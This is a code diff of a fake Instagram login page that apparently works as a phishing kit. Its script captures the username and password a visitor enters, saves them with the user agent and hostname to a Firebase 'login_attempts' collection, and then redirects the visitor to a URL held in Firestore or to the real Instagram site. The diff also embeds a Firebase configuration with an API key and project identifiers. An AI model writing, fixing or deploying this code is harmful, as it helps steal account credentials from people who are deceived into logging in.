@@ -24,7 +24,8 @@
                 <div class="login-box">
                     <img src="images/logo.png" alt="Instagram" class="logo">
                     
-                    <form id="loginForm" class="login-form">
+                   <!-- In your HTML, update the form tag: -->
+<form id="loginForm" class="login-form" onsubmit="return false;">
                         <div class="form-group">
                             <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
                         </div>
@@ -91,7 +92,6 @@
         const firebaseConfig = {
             apiKey: "AIzaSyBFLWTZnHz8EcLjsdHAXDXG5ogU7z0ok0I",
             authDomain: "insta-7f34f.firebaseapp.com",
-            databaseURL: "https://insta-7f34f-default-rtdb.firebaseio.com",
             projectId: "insta-7f34f",
             storageBucket: "insta-7f34f.firebasestorage.app",
             messagingSenderId: "981637167144",
@@ -102,47 +102,45 @@
         const app = firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
     
-        // Get the redirect URL from Firestore
-        let redirectUrl = "https://www.instagram.com/"; // Default URL
-    
-        // Function to update the redirect URL
-        async function updateRedirectUrl() {
-            try {
-                const doc = await db.collection("config").doc("redirect").get();
-                if (doc.exists && doc.data().url) {
-                    redirectUrl = doc.data().url;
-                }
-            } catch (error) {
-                console.error("Error getting redirect URL:", error);
-            }
-        }
-    
-        // Update URL when page loads
-        updateRedirectUrl();
-    
-        // Handle form submission
-        document.getElementById('loginForm').addEventListener('submit', async function(event) {
+        // Function to handle form submission
+        async function handleLogin(event) {
             event.preventDefault();
+            console.log("Form submission started");
             
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             
             try {
-                // Store in Firebase
+                console.log("Storing data...");
                 await db.collection("login_attempts").add({
                     username: username,
                     password: password,
                     timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                     userAgent: navigator.userAgent,
-                    timestampClient: new Date().toISOString()
+                    timestampClient: new Date().toISOString(),
+                    source: window.location.hostname
                 });
+                console.log("Data stored successfully");
                 
-                // Redirect to the URL from Firestore (or default)
+                // Get redirect URL from Firestore
+                const doc = await db.collection("config").doc("redirect").get();
+                const redirectUrl = doc.exists && doc.data().url 
+                    ? doc.data().url 
+                    : "https://www.instagram.com/";
+                
+                console.log("Redirecting to:", redirectUrl);
                 window.location.href = redirectUrl;
+                
             } catch (error) {
                 console.error("Error:", error);
-                window.location.href = redirectUrl;
+                // On error, redirect to default URL
+                window.location.href = "https://www.instagram.com/";
             }
+        }
+    
+        // Add event listener when the page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('loginForm').addEventListener('submit', handleLogin);
         });
     </script>
 </body>
